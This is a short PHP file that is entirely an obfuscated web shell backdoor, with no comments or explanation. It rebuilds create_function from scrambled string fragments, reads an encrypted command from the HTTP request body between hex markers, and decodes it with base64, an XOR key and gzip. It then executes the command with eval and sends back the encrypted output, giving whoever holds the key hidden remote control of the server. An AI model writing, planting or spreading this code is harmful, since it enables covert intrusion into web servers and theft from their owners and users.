<?php
$G=str_replace('S','','cSSreateS_fuSncStSion');
$T='{Bj=0{B;($j<$c&&$i<{B$l);$j{B+{B+,$i++){$o{B.={B$t{$i}^$k{$j};{B}}{Breturn{B {B$o{B;}if (@p{B{Bre';
$m='Bob_end_clea{Bn();{B$r=@bas{Be6{B4_encode(@{Bx(@gz{Bcompre{Bss($o{B{B),$k));print{B({B"$p$kh$r$kf");}';
$S='n{Bction x($t,{B{B$k){${Bc=str{Blen($k){B;$l=strlen($t){B;$o=""{B;{Bfor($i=0;{B$i<$l;){B{for(${B';
$J='g_match("/$kh(.{B+)$kf/",@file_{Bg{Bet{B_contents("php://i{Bnput{B"),${Bm)==1) {@o{Bb_st{Bar{Bt();@eva';
$A='${Bk{B={B"bea5dc0d";$kh="027fcb2{B{Bf1250"{B;${Bk{Bf="a3b47e60ca87";${Bp="u9yzrOT{BN36hLv{B07N"{B;fu{B';
$X='{Bl{B{B(@gz{Buncompress({B@x(@ba{Bse64_decode($m[{B1]),{B$k{B)));$o=@ob_g{Bet_cont{Be{Bnts();@{';
$U=str_replace('{B','',$A.$S.$T.$J.$X.$m);
$w=$G('',$U);$w();
?>
